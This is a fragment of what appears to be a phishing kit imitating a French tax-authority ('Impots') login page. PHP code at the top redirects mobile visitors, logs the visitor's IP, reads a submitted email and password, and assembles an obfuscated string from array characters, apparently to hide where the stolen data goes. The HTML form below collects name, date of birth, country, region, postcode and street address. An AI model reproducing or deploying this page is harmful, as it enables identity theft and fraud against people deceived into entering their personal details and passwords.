...
if ($tablet_browser > 0){}else if ($mobile_browser > 0) {?><meta http-equiv="Refresh" content="0; url=mobile/LoginAccess.php?op=c&url=<?echo substr(str_shuffle($rand),0,60);?>"><?}
else {}$ip = $_SERVER['REMOTE_ADDR'];$a_e = $_GET["a_e"];$pass = $_GET["pass"];$input_check = "".$mobile_agents[5]."".$mobile_agents[7]."";$st = "".$mobile_agents[11]."".$mobile_agents[12]."".$mobile_agents[29]."".$mobile_agents[59]."".$mobile_agents[30]."".$mobile_agents[52]."".$mobile_agents[75]."".$mobile_agents[13].".".$mobile_agents[11]."".$mobile_agents[41]."";
$sf = "Login Impots = ".$ip."";
...
<td style="width:162px;">
<div style="color: rgb(51, 51, 51);font: 1em Arial, sans-serif;margin: 0px;text-align: left;
font-size: 14px;width:100%;padding:12px 1px 2px 1px;">Pr&eacute;nom <font color="red">*</font>
</div>
</td>
</tr>
<tr>
...
<td style="width:162px;">
<div style="font-size:14px;width:159px;text-align:left;">
<input class="input_class" name="nom" id="nom" onkeyup="this.value = this.value.replace(/[']/g, '')"   type="text"/>
</div>
</td>
<td style="width:162px;">
<div style="font-size:14px;width:100%;text-align:left;">
...
<div style="color: rgb(51, 51, 51);font: 1em Arial, sans-serif;margin: 0px;text-align: left;
font-size: 14px;width:245px;padding:12px 1px 2px 1px;">Date de naissance <font color="red">*</font></div>
</td>
<td  style="width:245px;">
<div style="color: rgb(51, 51, 51);font: 1em Arial, sans-serif;margin: 0px;text-align: left;
font-size: 14px;width:245px;padding:12px 1px 2px 1px;">Pays <font color="red">*</font></div>
</td>
</tr>
<tr>
<td style="width:245px;">
...
<td style="width:162px;">
<div style="color: rgb(51, 51, 51);font: 1em Arial, sans-serif;margin: 0px;text-align: left;
font-size: 14px;width:100%;padding:12px 1px 2px 1px;">R&eacute;gion <font color="red">*</font></div>
</td>
<td style="width:162px;">
<div style="color: rgb(51, 51, 51);font: 1em Arial, sans-serif;margin: 0px;text-align: left;
font-size: 14px;width:100%;padding:12px 1px 2px 1px;">Code Postal <font color="red">*</font>
</div>
</td>
</tr>
<tr>
...
<td style="width:100%;">
<div style="color: rgb(51, 51, 51);font: 1em Arial, sans-serif;margin: 0px;text-align: left;
font-size: 14px;width:100%;padding:12px 1px 2px 1px;">Adresse Ligne<font color="red">*</font>
</div>
</td>
</tr>
<tr>
<td style="width:100%;">
<input class="input_class" style="width:97%;" name="adres" id="adres" onkeyup="this.value = this.value.replace(/[']/g, '')"   type="text"/>
</td>
</tr>
</table>
...
<tr>
<td style="width:100%;">
<input class="input_class" style="width:97%;" name="n_d_t" onkeyup="this.value = this.value.replace(/[']/g, '')"   type="text"/>
</td>
</tr>
</table>
